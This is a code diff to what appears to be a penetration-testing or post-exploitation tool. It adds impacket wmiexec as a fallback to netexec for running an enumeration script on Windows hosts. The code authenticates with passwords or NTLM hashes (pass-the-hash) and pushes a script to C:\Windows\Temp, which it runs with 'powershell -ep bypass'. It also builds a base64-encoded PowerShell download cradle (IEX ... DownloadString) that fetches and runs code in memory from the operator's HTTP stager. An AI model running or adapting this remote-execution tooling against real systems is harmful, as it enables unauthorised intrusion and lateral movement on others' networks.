@@ -27,7 +27,7 @@ import re
 import shutil
 import subprocess
 
-from .credenum import smb_tool
+from .credenum import impacket_tool, smb_tool
 from .models import Host
 
 _SCRIPT_DIR = os.path.join(os.path.dirname(__file__), "local")
@@ -212,6 +212,38 @@ def _nxc_auth(base: list, creds: dict) -> list:
     return argv
 
 
+# --- Windows exec engine: netexec OR impacket -----------------------------------
+# nxc is preferred (does WinRM + SMB + --put-file); impacket wmiexec is an
+# SMB/WMI exec-only fallback (both expected on Kali). wmiexec pairs cleanly with
+# --stager (it runs the download cradle in memory - no file push needed at all).
+
+def win_engine() -> tuple[str | None, str | None]:
+    tool = smb_tool()
+    if tool:
+        return "nxc", tool
+    wm = impacket_tool("wmiexec") or impacket_tool("atexec")
+    if wm:
+        return "impacket", wm
+    return None, None
+
+
+def _impacket_target(creds: dict, ip: str) -> str:
+    dom = creds.get("domain") or ""
+    prefix = f"{dom}/" if dom else ""
+    user = creds.get("username", "")
+    if creds.get("hash"):
+        return f"{prefix}{user}@{ip}"              # password supplied via -hashes
+    return f"{prefix}{user}:{creds.get('password', '')}@{ip}"
+
+
+def _wmiexec(tool: str, creds: dict, ip: str, command: str, timeout: int):
+    argv = [tool]
+    if creds.get("hash"):
+        argv += ["-hashes", f":{creds['hash']}"]
+    argv += [_impacket_target(creds, ip), command]
+    return _run(argv, timeout)
+
+
 def run_winrm(ip: str, creds: dict, script_text: str, timeout: int):
     tool = smb_tool()          # nxc / netexec / crackmapexec
     if not tool:
@@ -227,41 +259,62 @@ def run_winrm(ip: str, creds: dict, script_text: str, timeout: int):
 
 
 def run_smb(ip: str, creds: dict, script_path: str, timeout: int):
-    """Push recce-enum.ps1 to %TEMP%, run it, delete it. SMB exec (wmiexec-style)
-    needs local-admin on the target."""
-    tool = smb_tool()
+    """Push recce-enum.ps1 to %TEMP%, run it, delete it. Needs local-admin. Uses
+    nxc `--put-file` if present, else impacket (smbclient put + wmiexec run)."""
+    engine, tool = win_engine()
     if not tool:
-        return None, "netexec/nxc not installed (needed for SMB)"
-    remote = "C:\\Windows\\Temp\\rc_" + ip.replace(".", "_") + ".ps1"
-    put = _nxc_auth([tool, "smb", ip], creds) + ["--put-file", script_path, remote]
-    rc, pout, perr = _run(put, timeout)
-    if rc is None:
-        return None, perr
-    if _looks_like_auth_fail(pout, perr):
-        return None, "authentication failed / not admin (SMB put-file)"
-    ex = _nxc_auth([tool, "smb", ip], creds) + [
-        "-x", f"powershell -ep bypass -File {remote}"]
-    _, out, err = _run(ex, timeout)
-    # Best-effort cleanup - never leave the script behind.
-    _run(_nxc_auth([tool, "smb", ip], creds) + ["-x", f"del {remote}"], 60)
-    if _looks_like_auth_fail(out, err) and "recce-enum" not in out.lower():
+        return None, "no Windows exec tool (install netexec or impacket)"
+    remote_abs = "C:\\Windows\\Temp\\rc_" + ip.replace(".", "_") + ".ps1"
+    if engine == "nxc":
+        put = _nxc_auth([tool, "smb", ip], creds) + ["--put-file", script_path, remote_abs]
+        rc, pout, perr = _run(put, timeout)
+        if rc is None:
+            return None, perr
+        if _looks_like_auth_fail(pout, perr):
+            return None, "authentication failed / not admin (SMB put-file)"
+        ex = _nxc_auth([tool, "smb", ip], creds) + [
+            "-x", f"powershell -ep bypass -File {remote_abs}"]
+        _, out, err = _run(ex, timeout)
+        _run(_nxc_auth([tool, "smb", ip], creds) + ["-x", f"del {remote_abs}"], 60)
+    else:  # impacket: put via smbclient, run via wmiexec, delete
+        sc = impacket_tool("smbclient")
+        if not sc:
+            return None, ("impacket-only SMB push needs impacket-smbclient - install "
+                          "it, or use --stager (no file push), or install netexec")
+        rel = "Windows\\Temp\\rc_" + ip.replace(".", "_") + ".ps1"
+        argv = [sc]
+        if creds.get("hash"):
+            argv += ["-hashes", f":{creds['hash']}"]
+        argv += [_impacket_target(creds, ip)]
+        rc, pout, perr = _run(argv, timeout,
+                              stdin=f"use C$\nput {script_path} {rel}\nexit\n")
+        if rc is None:
+            return None, perr
+        if _looks_like_auth_fail(pout, perr):
+            return None, "authentication failed / not admin (SMB put)"
+        _, out, err = _wmiexec(tool, creds, ip,
+                               f"powershell -ep bypass -File {remote_abs}", timeout)
+        _wmiexec(tool, creds, ip, f"del {remote_abs}", 60)   # best-effort cleanup
+    if _looks_like_auth_fail(out, err) and "recce-enum" not in (out or "").lower():
         return None, "authentication failed / not permitted (SMB exec)"
     return out, None
 
 
 def run_win_stager(ip: str, creds: dict, sub: str, stager, timeout: int):
     """Trigger a Windows host to fetch recce-enum.ps1 from our HTTP stager and run
-    it in memory (no temp file, no size limit). `sub` is 'winrm' or 'smb'. Returns
-    (output|None, error|None, status) where status is 'ok' | 'unreachable' |
-    'authfail' | 'tool'."""
-    tool = smb_tool()
+    it in memory (no temp file, no size limit) via nxc OR impacket wmiexec. Returns
+    (output|None, error|None, status) - 'ok' | 'unreachable' | 'authfail' | 'tool'."""
+    engine, tool = win_engine()
     if not tool:
-        return None, "netexec/nxc not installed", "tool"
+        return None, "no Windows exec tool (install netexec or impacket)", "tool"
     cradle = f"IEX (New-Object Net.WebClient).DownloadString('{stager.url('recce-enum.ps1')}')"
-    flag = "-X" if sub == "winrm" else "-x"
-    argv = _nxc_auth([tool, sub, ip], creds) + [
-        flag, f"powershell -NoProfile -EncodedCommand {_b64_ps(cradle)}"]
-    rc, out, err = _run(argv, timeout)
+    ps = f"powershell -NoProfile -EncodedCommand {_b64_ps(cradle)}"
+    if engine == "nxc":
+        flag = "-X" if sub == "winrm" else "-x"
+        argv = _nxc_auth([tool, sub if sub == "winrm" else "smb", ip], creds) + [flag, ps]
+        rc, out, err = _run(argv, timeout)
+    else:  # impacket wmiexec runs the cradle over SMB/WMI (no WinRM exec in impacket)
+        rc, out, err = _wmiexec(tool, creds, ip, ps, timeout)
     if rc is None:
         return None, err, "unreachable"
     if "recce-enum" in (out or "").lower():
@@ -286,6 +339,10 @@ def deploy_one(host: Host, ssh_creds, win_creds, timeout: int = DEFAULT_TIMEOUT,
     if t == "ssh":
         out, err = run_ssh(host.ip, ssh_creds, _read(LINUX_SCRIPT), timeout)
         return t, out, err
+    # impacket has no WinRM exec, so if nxc is absent fall the WinRM pick down to
+    # SMB/WMI (as long as 445 is reachable).
+    if t == "winrm" and win_engine()[0] == "impacket" and 445 in {p.portid for p in host.open_ports}:
+        t = "smb"
     # Windows: try the in-memory HTTP stager first (if enabled), else push.
     if stager is not None:
         out, err, status = run_win_stager(host.ip, win_creds, t, stager, timeout)
